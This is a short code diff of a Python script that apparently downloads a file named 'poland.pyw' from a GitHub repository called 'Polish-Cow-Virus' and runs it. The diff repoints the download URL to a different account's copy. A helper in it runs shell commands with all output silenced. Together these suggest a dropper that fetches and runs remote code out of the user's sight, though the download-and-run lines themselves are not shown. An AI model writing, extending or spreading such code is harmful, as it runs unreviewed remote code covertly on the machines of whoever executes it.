@@ -4,7 +4,7 @@ import time
 import subprocess
 import urllib.request
 
-GITHUB_FILE_URL = "https://raw.githubusercontent.com/eggman1243/Polish-Cow-Virus/refs/heads/main/poland.pyw"
+GITHUB_FILE_URL = "https://raw.githubusercontent.com/lameman12/Polish-Cow-Virus/refs/heads/main/poland.pyw"
 
 def run(command):
     subprocess.check_call(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
